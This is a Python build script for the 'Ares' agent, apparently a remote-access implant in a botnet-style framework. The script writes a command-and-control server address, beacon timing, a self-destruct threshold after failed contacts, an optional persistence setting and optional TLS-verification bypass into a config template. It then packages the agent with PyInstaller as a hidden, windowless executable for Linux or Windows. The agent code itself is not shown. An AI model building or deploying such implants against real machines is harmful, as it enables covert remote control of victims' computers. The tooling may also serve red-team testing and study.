#!/usr/bin/env python

import os
import shutil
import tempfile


def build_agent(output, server_url, hello_interval, idle_time, max_failed_connections, persist, tls_verify, platform):
    prog_name = os.path.basename(output)
    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
    if os.path.exists(working_dir):
        shutil.rmtree(working_dir)
    agent_dir = os.getcwd()
    shutil.copytree(agent_dir, working_dir)
    with open(os.path.join(working_dir, "config.py"), 'w') as agent_config:
        with open(os.path.join(agent_dir, "template_config.py")) as f:
            config_file = f.read()
        config_file = config_file.replace("__SERVER__", server_url.rstrip('/'))
        config_file = config_file.replace("__HELLO_INTERVAL__", str(hello_interval))
        config_file = config_file.replace("__IDLE_TIME__", str(idle_time))
        config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed_connections))
        config_file = config_file.replace("__PERSIST__", str(persist))
        config_file = config_file.replace("__TLS_VERIFY__", str(tls_verify))
        agent_config.write(config_file)
    cwd = os.getcwd()
    os.chdir(working_dir)
    shutil.move('agent.py', prog_name + '.py')
    agent_file = os.path.join(working_dir, 'dist', prog_name)
    if platform == "linux":
        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
    elif platform == "windows":
        if os.name == "nt":
            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        else:
            os.system('wine pyinstaller --noconsole --onefile ' + prog_name + '.py')
        if not agent_file.endswith(".exe"):
            agent_file += ".exe"
        if not output.endswith(".exe"):
            output += ".exe"
    os.chdir(cwd)
    os.rename(agent_file, output)
    shutil.rmtree(working_dir)
    print("[+] Agent built successfully: %s" % output)


def main():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds an Ares agent.")
    parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
    parser.add_argument('-o', '--output', required=True, help="Output file name.")
    parser.add_argument('--hello-interval', type=int, default=60, help="Delay (in seconds) between each request to the CnC.")
    parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
    parser.add_argument('--max-failed-connections', type=int, default=5000, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
    parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
    parser.add_argument('--no-check-certificate', action='store_true', help="Disable server TLS certificate verification.")
    parser.add_argument('-p', '--platform', required=True, help="Platform (linux or windows)")
    args = parser.parse_args()

    args.platform = args.platform.lower()
    if args.platform not in ['linux', 'windows']:
        print("[!] Invalid plarform, should be windows or linux")
        exit(1)

    build_agent(
        output=args.output,
        server_url=args.server,
        hello_interval=args.hello_interval,
        idle_time=args.idle_time,
        max_failed_connections=args.max_failed_connections,
        persist=args.persistent,
        tls_verify=(not args.no_check_certificate),
        platform=args.platform)


if __name__ == "__main__":
    main()
